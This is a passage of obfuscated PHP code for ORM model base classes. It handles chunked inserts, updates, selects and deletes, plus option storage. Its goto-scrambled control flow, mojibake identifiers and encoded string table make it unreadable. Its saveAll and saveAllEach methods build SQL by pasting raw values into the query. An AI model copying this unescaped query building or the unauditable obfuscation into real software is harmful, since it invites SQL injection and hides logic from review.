$eáàí‚ñùÒ . $BĞ¼•®Ğ[4] . $AÊ‘ù¯™Î); $FÇ¹¹ÎÛù[] = array($e…²—®Ü” => $CŞª•›”£Î, $BĞ¼•®Ğ[89] => $AÊ‘ù¯™Î, $BĞ¼•®Ğ[368] => $dË¤‡ƒù–); } goto döƒ°êÀà; DŞÏÆÂåß™: $eáàí‚ñùÒ = $this->tableMeta[$BĞ¼•®Ğ[366]]; $eÈ‰Ï‡ß³ = Model($eáàí‚ñùÒ); $eš¹ã·×— = array($e…²—®Ü” => $CŞª•›”£Î, $BĞ¼•®Ğ[367] => $a…ÂÑê); goto f¢„ŸÛ®Ä; A»Ö¸±Ù‘•: } public function metaGet($d¬³×ŒŒÒ–) { goto F†×ãø’Û²; F†×ãø’Û²: $B•´ÍÇë™Å =& $_SERVER[í…¶]; if (!$this->tableMeta) { return array(); } $BˆãĞÆà¾ = $this->tableMeta[$B•´ÍÇë™Å[365]]; goto F·†Á–ÉöÜ; F·†Á–ÉöÜ: $bêÃçãè± = Model($this->tableMeta[$B•´ÍÇë™Å[366]]); $a¸Î´º…Ç¯ = array($BˆãĞÆà¾ => $d¬³×ŒŒÒ–); $F²¬¾ç·¥ = $bêÃçãè±->field($B•´ÍÇë™Å[369])->where($a¸Î´º…Ç¯)->select(); goto DÎŸ¢Á…Ã½; DÎŸ¢Á…Ã½: $F²¬¾ç·¥ = array_to_keyvalue($F²¬¾ç·¥, $B•´ÍÇë™Å[89], $B•´ÍÇë™Å[368]); return $F²¬¾ç·¥; goto a¶ù»§ó©Ê; a¶ù»§ó©Ê: } private function checkDataAutoHas($b‚“ÙŠ„’) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $CŒ­Ğ“®Óˆ) { if (in_array($b‚“ÙŠ„’, explode($_SERVER[í…¶][47], $CŒ­Ğ“®Óˆ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$C¢Óñˆ‚Î×, $dñ¢Áğ›á) { $a´ŒŸÄ¿½ =& $_SERVER[í…¶]; foreach ($this->dataAuto as $A±÷Âë‹··) { $Dò™¬ƒÙœ = $A±÷Âë‹··[0]; if (!in_array($dñ¢Áğ›á, explode($a´ŒŸÄ¿½[47], $A±÷Âë‹··[2]))) { continue; } switch (trim($A±÷Âë‹··[3])) { case $a´ŒŸÄ¿½[309]: case $a´ŒŸÄ¿½[310]: $e‡·‘«Ô‰ = $A±÷Âë‹··[1]; $Có‚´ì²à = isset($A±÷Âë‹··[4]) ? (array) $A±÷Âë‹··[4] : array(); if ($e‡·‘«Ô‰ == $a´ŒŸÄ¿½[190] && array_key_exists($Dò™¬ƒÙœ, $C¢Óñˆ‚Î×)) { if (!$C¢Óñˆ‚Î×[$Dò™¬ƒÙœ]) { unset($C¢Óñˆ‚Î×[$Dò™¬ƒÙœ]); } break; } if (isset($C¢Óñˆ‚Î×[$Dò™¬ƒÙœ])) { array_unshift($Có‚´ì²à, $C¢Óñˆ‚Î×[$Dò™¬ƒÙœ]); } if ($a´ŒŸÄ¿½[309] == $A±÷Âë‹··[3]) { $C¢Óñˆ‚Î×[$Dò™¬ƒÙœ] = call_user_func_array($e‡·‘«Ô‰, $Có‚´ì²à); } else { $C¢Óñˆ‚Î×[$Dò™¬ƒÙœ] = call_user_func_array(array(&$this, $e‡·‘«Ô‰), $Có‚´ì²à); } break; case $a´ŒŸÄ¿½[261]: $C¢Óñˆ‚Î×[$Dò™¬ƒÙœ] = $C¢Óñˆ‚Î×[$A±÷Âë‹··[1]]; break; case $a´ŒŸÄ¿½[282]: if (isset($C¢Óñˆ‚Î×[$Dò™¬ƒÙœ]) && !is_string($C¢Óñˆ‚Î×[$Dò™¬ƒÙœ])) { $C¢Óñˆ‚Î×[$Dò™¬ƒÙœ] = json_encode_force($C¢Óñˆ‚Î×[$Dò™¬ƒÙœ]); } break; case $a´ŒŸÄ¿½[311]: if ($C¢Óñˆ‚Î×[$Dò™¬ƒÙœ] === $a´ŒŸÄ¿½[33]) { unset($C¢Óñˆ‚Î×[$Dò™¬ƒÙœ]); } break; case $a´ŒŸÄ¿½[312]: $C¢Óñˆ‚Î×[$Dò™¬ƒÙœ] = $A±÷Âë‹··[1]; default: break; } } if ($dñ¢Áğ›á == $a´ŒŸÄ¿½[353]) { $BôòßøÑÌ­ = strtolower($this->db->getDbType()); if (strpos($BôòßøÑÌ­, $a´ŒŸÄ¿½[9]) !== 0) { return; } $fÌ­Ÿå¨ÍÙ = $this->field(!0)->fields; $FŠÂ®”£Ê× = $fÌ­Ÿå¨ÍÙ[$a´ŒŸÄ¿½[240]]; if (isset($fÌ­Ÿå¨ÍÙ[$a´ŒŸÄ¿½[239]])) { unset($FŠÂ®”£Ê×[$fÌ­Ÿå¨ÍÙ[$a´ŒŸÄ¿½[239]]]); } foreach ($FŠÂ®”£Ê× as $câ±¦‰á˜ => $dñ¢Áğ›á) { if (!isset($C¢Óñˆ‚Î×[$câ±¦‰á˜])) { $C¢Óñˆ‚Î×[$câ±¦‰á˜] = $a´ŒŸÄ¿½[33]; } } } } private function dataAfterFilter(&$Cß—¶ñˆÒº) { $FªÎñë¾ =& $_SERVER[í…¶]; foreach ($this->dataAuto as $DÕ¤Î¸Úàô) { $aÖ…Èè‚§÷ = $DÕ¤Î¸Úàô[0]; if (!in_array($FªÎñë¾[355], explode($FªÎñë¾[47], $DÕ¤Î¸Úàô[2]))) { continue; } if (!isset($Cß—¶ñˆÒº[$aÖ…Èè‚§÷])) { continue; } switch (trim($DÕ¤Î¸Úàô[3])) { case $FªÎñë¾[309]: case $FªÎñë¾[310]: $b•ˆÖÆëò‘ = isset($DÕ¤Î¸Úàô[4]) ? (array) $DÕ¤Î¸Úàô[4] : array(); array_unshift($b•ˆÖÆëò‘, $Cß—¶ñˆÒº[$aÖ…Èè‚§÷]); if ($FªÎñë¾[309] == $DÕ¤Î¸Úàô[3]) { $Cß—¶ñˆÒº[$aÖ…Èè‚§÷] = call_user_func_array($DÕ¤Î¸Úàô[1], $b•ˆÖÆëò‘); } else { $Cß—¶ñˆÒº[$aÖ…Èè‚§÷] = call_user_func_array(array(&$this, $DÕ¤Î¸Úàô[1]), $b•ˆÖÆëò‘); } break; case $FªÎñë¾[261]: $Cß—¶ñˆÒº[$aÖ…Èè‚§÷] = $Cß—¶ñˆÒº[$DÕ¤Î¸Úàô[1]]; break; case $FªÎñë¾[282]: $F¨Û…¯‡ = $Cß—¶ñˆÒº[$aÖ…Èè‚§÷]; $Cß—¶ñˆÒº[$aÖ…Èè‚§÷] = json_decode($F¨Û…¯‡, !0); if (is_null($Cß—¶ñˆÒº[$aÖ…Èè‚§÷])) { $Cß—¶ñˆÒº[$aÖ…Èè‚§÷] = $F¨Û…¯‡; } break; case $FªÎñë¾[311]: if ($Cß—¶ñˆÒº[$aÖ…Èè‚§÷] === $FªÎñë¾[33]) { unset($Cß—¶ñˆÒº[$aÖ…Èè‚§÷]); } break; case $FªÎñë¾[312]: $Cß—¶ñˆÒº[$aÖ…Èè‚§÷] = $DÕ¤Î¸Úàô[1]; default: break; } } } public function saveAll($AÃ÷Ïš¹è‰) { goto a—ó ªÆÄµ; a—ó ªÆÄµ: $cÏÍ—ğ¢¹¨ =& $_SERVER[í…¶]; $cå†Õ‰·‹¶ = $this->tablePrefix . $this->tableName; $AÇª¯ÄåôÎ = self::SQL_WHERE_IN_CHUNK; goto d‘­¬„´¨; b”•­÷ä‘¬: $this->chunkEventSet(); goto b„ä¹³ÑÕ; a¥Û¹Á‹ ñ: $C–ù°©­ºÇ = array(); $AÙâ¦¢ùÇ” = count($AÃ÷Ïš¹è‰); for ($fªÈ†­Šó³ = 0; $fªÈ†­Šó³ < $AÙâ¦¢ùÇ”; $fªÈ†­Šó³++) { $Fô‚Ø†¶‹ó = $AÃ÷Ïš¹è‰[$fªÈ†­Šó³]; if (!is_array($Fô‚Ø†¶‹ó) || count($Fô‚Ø†¶‹ó) != 4) { continue; } $DÁ†İòµ×´ = "\125\x50\x44\101\x54\x45\40\140{$cå†Õ‰·‹¶}\140\40\123\x45\x54\x20{$Fô‚Ø†¶‹ó[2]}\x20\75\40\x43\101\x53\105\40{$Fô‚Ø†¶‹ó[0]}\40\xa"; if ($DÒô§ù…²î == 0) { $cšÛŠÙèàö = $DÁ†İòµ×´; } $C–ù°©­ºÇ[] = $cÏÍ—ğ¢¹¨[113] . $Fô‚Ø†¶‹ó[1] . $cÏÍ—ğ¢¹¨[113]; $DÒô§ù…²î++; $cšÛŠÙèàö .= "\x20\127\x48\105\x4e\40\x27{$Fô‚Ø†¶‹ó[1]}\47\40\124\x48\105\116\x20\x27{$Fô‚Ø†¶‹ó[3]}\x27\40\xa"; if ($DÒô§ù…²î == $AÇª¯ÄåôÎ || $fªÈ†­Šó³ == $AÙâ¦¢ùÇ” - 1) { goto C¡÷Ğ»¬®; C¡÷Ğ»¬®: $FèÃ˜òó®› = implode($cÏÍ—ğ¢¹¨[47], $C–ù°©­ºÇ); $cšÛŠÙèàö .= "\x20\x45\116\x44\40\40\x57\110\x45\122\x45\40{$Fô‚Ø†¶‹ó[0]}\40\x49\116\x20\x28{$FèÃ˜òó®›}\51\40"; $this->execute($cšÛŠÙèàö); goto DáíÑ¢®¸Ø; aÅÚ÷ÄÕ: $C–ù°©­ºÇ = array(); goto DÚ˜Ğ×•…¦; DáíÑ¢®¸Ø: $DÒô§ù…²î = 0; $cšÛŠÙèàö = $DÁ†İòµ×´; $this->chunkEventCheck(count($C–ù°©­ºÇ)); goto aÅÚ÷ÄÕ; DÚ˜Ğ×•…¦: } } goto b”•­÷ä‘¬; d‘­¬„´¨: $AÃ÷Ïš¹è‰ = is_array($AÃ÷Ïš¹è‰) ? $AÃ÷Ïš¹è‰ : array(); $cšÛŠÙèàö = $cÏÍ—ğ¢¹¨[370]; $DÒô§ù…²î = 0; goto a¥Û¹Á‹ ñ; b„ä¹³ÑÕ: } public function saveAllEach($AË•÷§—ŠÈ) { $aÁà•Á³ä =& $_SERVER[í…¶]; $BŞÄ‹±´ß› = $this->tablePrefix . $this->tableName; foreach ($AË•÷§—ŠÈ as $F‹Ÿá Ş²´) { if (!is_array($F‹Ÿá Ş²´) || count($F‹Ÿá Ş²´) != 4) { continue; } $c¯¶á„Ò ­ = $F‹Ÿá Ş²´[0] . $aÁà•Á³ä[371] . $F‹Ÿá Ş²´[1] . $aÁà•Á³ä[113]; $b÷ø·«•¬ = $F‹Ÿá Ş²´[2] . $aÁà•Á³ä[371] . $F‹Ÿá Ş²´[3] . $aÁà•Á³ä[113]; $FåÏÙìÁ£í = "\x75\x70\x64\141\x74\x65\40{$BŞÄ‹±´ß›}\x20\163\x65\x74\x20{$b÷ø·«•¬}\x20\167\150\145\x72\145\40{$c¯¶á„Ò ­}\73"; $this->execute($FåÏÙìÁ£í); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($fë¹ê÷‘Û = false, $F½Çé¦£ù½ = false) { $this->_chunkEvent = $fë¹ê÷‘Û; $this->_chunkEventParam = $F½Çé¦£ù½; } private function chunkEventCheck($BŸ¯İ¥‹) { if (!$this->_chunkEvent) { return; } $Dˆç¦……ùà = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Dˆç¦……ùà[$_SERVER[í…¶][372]] = $BŸ¯İ¥‹; Hook::trigger($this->_chunkEvent, $Dˆç¦……ùà); } public function addAll($F×˜Ï–øªå, $c®õèòÖà‰ = array(), $dà£ØËÏ = false) { goto c‚™õóøœ–; C–®ùôÇŠ: if (empty($F×˜Ï–øªå)) { $this->error = think_lang($cœ¿‘Ñ‹°ï[259]); return !1; } $c®õèòÖà‰ = $this->_parseOptions($c®õèòÖà‰); foreach ($F×˜Ï–øªå as $EÖšå½¾¯¼ => $d—æğ£–ÇÊ) { $F×˜Ï–øªå[$EÖšå½¾¯¼] = $this->_facade($d—æğ£–ÇÊ); $this->_beforeInsert($F×˜Ï–øªå[$EÖšå½¾¯¼], $c®õèòÖà‰); } goto EŒø‘½óÛ·; EŒø‘½óÛ·: if (method_exists($this->db, $cœ¿‘Ñ‹°ï[260])) { for ($Dîåá¯ëé‹ = 0; $Dîåá¯ëé‹ < count($F×˜Ï–øªå); $Dîåá¯ëé‹ += $Cá¸¦‰©) { $bßáß—¢„Ô = array_slice($F×˜Ï–øªå, $Dîåá¯ëé‹, $Cá¸¦‰©); if (!is_array($bßáß—¢„Ô) || count($bßáß—¢„Ô) == 0) { break; } $d¿¿–øƒó = $this->db->insertAll($bßáß—¢„Ô, $c®õèòÖà‰, $dà£ØËÏ); $this->chunkEventCheck(count($bßáß—¢„Ô)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($F×˜Ï–øªå as $EÖšå½¾¯¼ => $d—æğ£–ÇÊ) { $d¿¿–øƒó = $this->db->insert($d—æğ£–ÇÊ, $c®õèòÖà‰, $dà£ØËÏ); } $this->commit(); } if (!1 !== $d¿¿–øƒó) { $Bª„‘ŸíŸ© = $this->getLastInsID(); if ($Bª„‘ŸíŸ©) { return $Bª„‘ŸíŸ©; } } return $d¿¿–øƒó; goto Eµ–ğñÖÆ¸; c‚™õóøœ–: $cœ¿‘Ñ‹°ï =& $_SERVER[í…¶]; ignore_timeout(); $Cá¸¦‰© = self::SQL_WHERE_IN_CHUNK; goto C–®ùôÇŠ; Eµ–ğñÖÆ¸: } public function save($B…ˆ‹·¼íÙ = '', $FêÇ™ª¡¼ƒ = array()) { goto eè»¥ÌÕŸ˜; Ağ÷±ÏÃ: for ($AÏ§‡óØ…ä = 0; $AÏ§‡óØ…ä < $CšÆ¾Ü—œ×; $AÏ§‡óØ…ä += $A§¬Éîéï) { $D˜¼ØùøÎ» = array_slice($f¢¶¡ÓÑŞ, $AÏ§‡óØ…ä, $A§¬Éîéï); if (!is_array($D˜¼ØùøÎ») || count($D˜¼ØùøÎ») == 0) { break; } $b›ŞŒôÜÌø[$A³Ïò¢Ù‡Ó[263]][$Eöµï„¥Š«][1] = $D˜¼ØùøÎ»; $this->optionsValue($b›ŞŒôÜÌø); $bÁÖëÆèƒ… += parent::save($B…ˆ‹·¼íÙ, $FêÇ™ª¡¼ƒ); $this->chunkEventCheck(count($D˜¼ØùøÎ»)); } $this->chunkEventSet(); return $bÁÖëÆèƒ…; goto D¡éÇêåƒ¿; bõ„²œáê: $Eöµï„¥Š« = $this->findWhereField($b›ŞŒôÜÌø); if (!$Eöµï„¥Š«) { return parent::save($B…ˆ‹·¼íÙ, $FêÇ™ª¡¼ƒ); } $bÁÖëÆèƒ… = 0; goto d‚”»ßé‚á; d‚”»ßé‚á: $f¢¶¡ÓÑŞ = $b›ŞŒôÜÌø[$A³Ïò¢Ù‡Ó[263]][$Eöµï„¥Š«][1]; $f¢¶¡ÓÑŞ = is_array($f¢¶¡ÓÑŞ) ? $f¢¶¡ÓÑŞ : array(); $CšÆ¾Ü—œ× = count($f¢¶¡ÓÑŞ); goto Ağ÷±ÏÃ; eè»¥ÌÕŸ˜: $A³Ïò¢Ù‡Ó =& $_SERVER[í…¶]; $A§¬Éîéï = self::SQL_WHERE_IN_CHUNK; $b›ŞŒôÜÌø = $this->optionsValue(); goto bõ„²œáê; D¡éÇêåƒ¿: } public function add($b«¼˜Ø¥‹ = '', $BŸ¡©ƒ½‰ = array(), $Eß¾ˆğ„›Ğ = false) { if ($this->addTaskStatus && is_array($b«¼˜Ø¥‹)) { $this->addTaskData[] = $b«¼˜Ø¥‹; return; } return parent::add($b«¼˜Ø¥‹, $BŸ¡©ƒ½‰, $Eß¾ˆğ„›Ğ); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($e„®ó“ÍÄÎ = array()) { goto FÛŠÂå­£„; FÛŠÂå­£„: $f›ß˜íœ£ =& $_SERVER[í…¶]; $cĞÏÏÈàß = self::SQL_WHERE_IN_CHUNK; $B”ÏÙ•í‚¾ = $this->optionsValue(); goto cœÄÔ«„; cœÄÔ«„: $eç¥¯ˆ‡Ş’ = $this->findWhereField($B”ÏÙ•í‚¾); if (!$eç¥¯ˆ‡Ş’ || isset($B”ÏÙ•í‚¾[$f›ß˜íœ£[280]]) || isset($B”ÏÙ•í‚¾[$f›ß˜íœ£[340]])) { return parent::select($e„®ó“ÍÄÎ); } $FÃùó…¶‰‚ = $B”ÏÙ•í‚¾[$f›ß˜íœ£[263]][$eç¥¯ˆ‡Ş’][1]; goto Cˆ‡„³°ÔÁ; dÚåš°‹ì¼: return $cØèÜĞä…–; goto D±¹²ïØì; Cˆ‡„³°ÔÁ: $FÃùó…¶‰‚ = is_array($FÃùó…¶‰‚) ? $FÃùó…¶‰‚ : array(); $cØèÜĞä…– = null; for ($A–Á‡‹¦´Ó = 0; $A–Á‡‹¦´Ó < count($FÃùó…¶‰‚); $A–Á‡‹¦´Ó += $cĞÏÏÈàß) { $cƒùøÉßñé = array_slice($FÃùó…¶‰‚, $A–Á‡‹¦´Ó, $cĞÏÏÈàß); if (!is_array($cƒùøÉßñé) || count($cƒùøÉßñé) == 0) { break; } $B”ÏÙ•í‚¾[$f›ß˜íœ£[263]][$eç¥¯ˆ‡Ş’][1] = $cƒùøÉßñé; $this->optionsValue($B”ÏÙ•í‚¾); $dİ©¯‘ÓÈ† = parent::select($e„®ó“ÍÄÎ); if (!$dİ©¯‘ÓÈ†) { continue; } if (is_null($cØèÜĞä…–)) { $cØèÜĞä…– = array(); } $cØèÜĞä…– = array_merge($cØèÜĞä…–, $dİ©¯‘ÓÈ†); } goto dÚåš°‹ì¼; D±¹²ïØì: } public function delete($dİÆÊ‡Ö‡ = array()) { goto bØŞÛÜ‹¹Ô; béáÜˆ—–: $C£ËÆ¼ˆÑÏ = $CÂÒ±ÚáÔï[$c¢àéÌ„îÜ[263]][$BÊšÈÓ˜é][1]; $C£ËÆ¼ˆÑÏ = is_array($C£ËÆ¼ˆÑÏ) ? $C£ËÆ¼ˆÑÏ : array(); for ($FŠÂŞÁÇœ‹ = 0; $FŠÂŞÁÇœ‹ < count($C£ËÆ¼ˆÑÏ); $FŠÂŞÁÇœ‹ += $c™ßÒÓè÷) { $F‰ÖÙŒ“Š¹ = array_slice($C£ËÆ¼ˆÑÏ, $FŠÂŞÁÇœ‹, $c™ßÒÓè÷); if (!is_array($F‰ÖÙŒ“Š¹) || count($F‰ÖÙŒ“Š¹) == 0) { break; } $CÂÒ±ÚáÔï[$c¢àéÌ„îÜ[263]][$BÊšÈÓ˜é][1] = $F‰ÖÙŒ“Š¹; $this->optionsValue($CÂÒ±ÚáÔï); $AÂ´‡»™ += parent::delete($dİÆÊ‡Ö‡); } goto CªŒ×½•Ù; CªŒ×½•Ù: return $AÂ´‡»™; goto F†Ä—ƒŞï»; bØŞÛÜ‹¹Ô: $c¢àéÌ„îÜ =& $_SERVER[í…¶]; $c™ßÒÓè÷ = self::SQL_WHERE_IN_CHUNK; $CÂÒ±ÚáÔï = $this->optionsValue(); goto bë¬¾éø¶¤; bë¬¾éø¶¤: $BÊšÈÓ˜é = $this->findWhereField($CÂÒ±ÚáÔï); if (!$BÊšÈÓ˜é) { return parent::delete($dİÆÊ‡Ö‡); } $AÂ´‡»™ = 0; goto béáÜˆ—–; F†Ä—ƒŞï»: } private function findWhereField($eÆÏãÚãÅß) { $BÓœÑ‰õ =& $_SERVER[í…¶]; $E••‡Œùˆ = self::SQL_WHERE_IN_CHUNK; if (!is_array($eÆÏãÚãÅß) || !is_array($eÆÏãÚãÅß[$BÓœÑ‰õ[263]])) { return !1; } foreach ($eÆÏãÚãÅß[$BÓœÑ‰õ[263]] as $b›ØĞ³»ê© => $C«Ì¾¦éƒ©) { if (is_array($C«Ì¾¦éƒ©) && isset($C«Ì¾¦éƒ©[0]) && is_string($C«Ì¾¦éƒ©[0]) && strtolower($C«Ì¾¦éƒ©[0]) == $BÓœÑ‰õ[7] && is_array($C«Ì¾¦éƒ©[1]) && count($C«Ì¾¦éƒ©[1]) > $E••‡Œùˆ) { ignore_timeout(); return $b›ØĞ³»ê©; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\164\145\155\x4f\160\164\x69\x6f\156"; public $field = array(); public function listData($a„•™˜Ö£¶ = false, $aßê ÏõªÖ = "\155\x6f\144\151\x66\x79\124\x69\x6d\x65", $BÓ×¢«ÕÌô = false) { $BËõøˆÉœ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$BËõøˆÉœ) { return $a„•™˜Ö£¶ ? null : array(); } if (!$a„•™˜Ö£¶) { $BËõøˆÉœ = array_filter(array_values($BËõøˆÉœ)); return array_sort_by($BËõøˆÉœ, $aßê ÏõªÖ, $BÓ×¢«ÕÌô); } return $BËõøˆÉœ[$_SERVER[í…¶][373] . $a„•™˜Ö£¶]; } public function insert($d’½«„Ñ’ô) { goto C—æÎ¹ˆŒñ; AŠÈ®Ä®ñ: $d’½«„Ñ’ô[$CëàŞ¹¨É[107]] = time(); Model($this->modelType)->set($CëàŞ¹¨É[374], $Eª§ÒŠ·°, $this->optionType . $CëàŞ¹¨É[375]); Model($this->modelType)->set($CëàŞ¹¨É[373] . $Eª§ÒŠ·°, $d’½«„Ñ’ô, $this->optionType); goto EÚâ‡ÚƒŠÊ; EÚâ‡ÚƒŠÊ: return $Eª§ÒŠ·°; goto aƒ«ŠÑ”É°; fÑ¼ˆŠ‡ÂÓ: $Eª§ÒŠ·° = $Eª§ÒŠ·° ? $Eª§ÒŠ·° : 0; $d’½«„Ñ’ô[$CëàŞ¹¨É[376]] = ++$Eª§ÒŠ·°; $d’½«„Ñ’ô[$CëàŞ¹¨É[187]] = time(); goto AŠÈ®Ä®ñ; C—æÎ¹ˆŒñ: $CëàŞ¹¨É =& $_SERVER[í…¶]; $d’½«„Ñ’ô = array_field_key($d’½«„Ñ’ô, $this->field); $Eª§ÒŠ·° = Model($this->modelType)->get($CëàŞ¹¨É[374], $this->optionType . $CëàŞ¹¨É[375]); goto fÑ¼ˆŠ‡ÂÓ; aƒ«ŠÑ”É°: } public function update($fÒàÈ÷¶Ú, $Cğ„•›„Û) { goto fÊ·ÇÉ’œ´; fÊ·ÇÉ’œ´: $a¥õËÌàì =& $_SERVER[í…¶]; $Cğ„•›„Û = array_field_key($Cğ„•›„Û, $this->field); $fÆ†ò ’Î = $this->listData($fÒàÈ÷¶Ú); goto fïõÒ†œ¾Ò; Aõ½Öóó¨‘: return Model($this->modelType)->set($a¥õËÌàì[373] . $fÒàÈ÷¶Ú, $Cğ„•›„Û, $this->optionType); goto Dè—™•Ê‘; fïõÒ†œ¾Ò: if (!$fÆ†ò ’Î) { return !1; } $Cğ„•›„Û = array_merge($fÆ†ò ’Î, $Cğ„•›„Û); $Cğ„•›„Û[$a¥õËÌàì[107]] = time(); goto Aõ½Öóó¨‘; Dè—™•Ê‘: } public function remove($DêÅ›»Ìİ) { return Model($this->modelType)->remove($_SERVER[í…¶][373] . $DêÅ›»Ìİ, $this->optionType); } public function clear() { $døá—à•âö =& $_SERVER[í…¶]; Model($this->modelType)->remove($døá—à•âö[374], $this->optionType . $døá—à•âö[375]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($A”ˆ¶Øë·, $bÚË‚ãóí‚) { if (!$bÚË‚ãóí‚) { return !1; } $bŠÂ¦¤óƒœ = $this->listData(); $bŠÂ¦¤óƒœ = array_to_keyvalue($bŠÂ¦¤óƒœ, $A”ˆ¶Øë·); return isset($bŠÂ¦¤óƒœ[$bÚË‚ãóí‚]) ? $bŠÂ¦¤óƒœ[$bÚË‚ãóí‚] : !1; } public function findByName($aØ”ä„Í—«) { return $this->findByKey($_SERVER[í…¶][28], $aØ”ä„Í—«); } protected function resetData($Cº¸ô§Ø­¿) { $DøÜ„»ÜÉÃ =& $_SERVER[í…¶]; $Cº¸ô§Ø­¿ = is_array($Cº¸ô§Ø­¿) ? $Cº¸ô§Ø­¿ : array(); $eìâ™‡Èˆ = array(); for ($FšÍœ£šíå = 0; $FšÍœ£šíå < count($Cº¸ô§Ø­¿); $FšÍœ£šíå++) { $eìâ™‡Èˆ[$DøÜ„»ÜÉÃ[373] . $Cº¸ô§Ø­¿[$FšÍœ£šíå][$DøÜ„»ÜÉÃ[376]]] = $Cº¸ô§Ø­¿[$FšÍœ£šíå]; } return Model($this->modelType)->set($eìâ™‡Èˆ, !1, $this->optionType); } private function getAutoName($dâµ‰Óİæó) { $Dí‘éé±Ì = array_to_keyvalue($this->listData(), $_SERVER[í…¶][28]); if (!$Dí‘éé±Ì || !isset($Dí‘éé±Ì[$dâµ‰Óİæó])) { return $dâµ‰Óİæó; } for ($aŞÇïğäÈ = 1; $aŞÇïğäÈ < count($Dí‘éé±Ì); $aŞÇïğäÈ++) { $aïÚ›„Ë˜† = $dâµ‰Óİæó . "\x28{$aŞÇïğäÈ}\x29"; if (!isset($Dí‘éé±Ì[$aïÚ›„Ë˜†])) { return $aïÚ›„Ë˜†; } } return $aïÚ›„Ë˜†; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($AŞ„‚¢¥ÆÁ = false, $d¹‹ˆÔŠÜˆ = '', $cÜäïÌ‹¼Ÿ = false) { goto A‚Ó¿‡ˆµï; e§ÇäÂËƒï: $Dóç„ãÕØğ = $this->where($E “æ½½­)->select(); $Dóç„ãÕØğ = array_to_keyvalue($Dóç„ãÕØğ, $fø‚ã•æ¸Š[89], $fø‚ã•æ¸Š[368]); foreach ($Dóç„ãÕØğ as $A‹ÎÉø˜ôá => $BŒù’¶ãà×) { if ($cÜäïÌ‹¼Ÿ || in_array($A‹ÎÉø˜ôá, $this->jsonField)) { $Dóç„ãÕØğ[$A‹ÎÉø˜ôá] = json_decode($BŒù’¶ãà×, !0); } } goto D¤Ï»Ê‚º—; eŒ—æĞìš: $A¾ĞÕ×ó¡º = is_array($A¾ĞÕ×ó¡º) ? $A¾ĞÕ×ó¡º : array(); if (is_array($Dóç„ãÕØğ)) { $Dóç„ãÕØğ = array_merge($A¾ĞÕ×ó¡º, $Dóç„ãÕØğ); return $AŞ„‚¢¥ÆÁ ? isset($Dóç„ãÕØğ[$AŞ„‚¢¥ÆÁ]) ? $Dóç„ãÕØğ[$AŞ„‚¢¥ÆÁ] : null : $Dóç„ãÕØğ; } $E “æ½½­ = $this->filterWhere(array($fø‚ã•æ¸Š[29] => $d¹‹ˆÔŠÜˆ)); goto e§ÇäÂËƒï; D¤Ï»Ê‚º—: $this->cacheSet($d¹‹ˆÔŠÜˆ, $Dóç„ãÕØğ); $Dóç„ãÕØğ = array_merge($A¾ĞÕ×ó¡º, $Dóç„ãÕØğ); return $AŞ„‚¢¥ÆÁ ? $Dóç„ãÕØğ[$AŞ„‚¢¥ÆÁ] : $Dóç„ãÕØğ; goto B ¸¹ÜèŸ ; A‚Ó¿‡ˆµï: $fø‚ã•æ¸Š =& $_SERVER[í…¶]; $Dóç„ãÕØğ = $this->cacheGet($d¹‹ˆÔŠÜˆ); $A¾ĞÕ×ó¡º = $this->optionDefault($d¹‹ˆÔŠÜˆ); goto eŒ—æĞìš; B ¸¹ÜèŸ : } public function set($Cù¿Ä¸„¼ˆ, $Eªªƒœäâ = false, $a¥¤Ñƒò¤ = '') { goto AÃä¿”‹¨º; AÃä¿”‹¨º: $c–ÇƒìùŞÖ =& $_SERVER[í…¶]; $this->cacheRemove($a¥¤Ñƒò¤); $EŸ™‰Œ¹ÃÅ = array(); goto CÓ³¥Ö®É”; CÓ³¥Ö®É”: $b¡ŠÆèøø´ = is_array($Cù¿Ä¸„¼ˆ) ? $Cù¿Ä¸„¼ˆ : array($Cù¿Ä¸„¼ˆ => $Eªªƒœäâ); foreach ($b¡ŠÆèøø´ as $eÒŞÄ³†‚ => $FÒ‹„Òìë„) { if (is_array($FÒ‹„Òìë„)) { $FÒ‹„Òìë„ = json_encode_force($FÒ‹„Òìë„); } $this->checkLength($FÒ‹„Òìë„, !1, $this->tableName . $c–ÇƒìùŞÖ[4] . $Cù¿Ä¸„¼ˆ); $FÒ‹„Òìë„ = self::textEncode($FÒ‹„Òìë„); $b¡ŠÆèøø´ = array($c–ÇƒìùŞÖ[29] => $a¥¤Ñƒò¤, $c–ÇƒìùŞÖ[89] => $eÒŞÄ³†‚, $c–ÇƒìùŞÖ[368] => $FÒ‹„Òìë„); $EŸ™‰Œ¹ÃÅ[] = $this->filterWhere($b¡ŠÆèøø´); } if (!$EŸ™‰Œ¹ÃÅ) { return !0; } goto Cƒ Õ•ÒôÔ; Cƒ Õ•ÒôÔ: return $this->addAll($EŸ™‰Œ¹ÃÅ, array(), !0); goto CÔï„Éˆ¾·; CÔï„Éˆ¾·: } protected function optionDefault($cÇ±†Çƒ´¡ = '') { return !1; } public function setDeep($d²Ğ§ó††º, $C‚ª’Ùò‹Ş = false, $C—‚ß›µÇÚ = '') { $C•İª–ãá = explode($_SERVER[í…¶][91], $d²Ğ§ó††º); $cî©‘“˜ò = $this->get(); array_set_value($cî©‘“˜ò, $d²Ğ§ó††º, $C‚ª’Ùò‹Ş); $this->set($C•İª–ãá[0], $cî©‘“˜ò[$C•İª–ãá[0]], $C—‚ß›µÇÚ); } public function remove($C·é†±ğõŠ, $Bœ«î„¯¨Ê = '') { $cßíù¶÷ğÏ =& $_SERVER[í…¶]; $this->cacheRemove($Bœ«î„¯¨Ê); $Dâö ÔöĞÔ = $this->filterWhere(array($cßíù¶÷ğÏ[89] => $C·é†±ğõŠ, $cßíù¶÷ğÏ[29] => 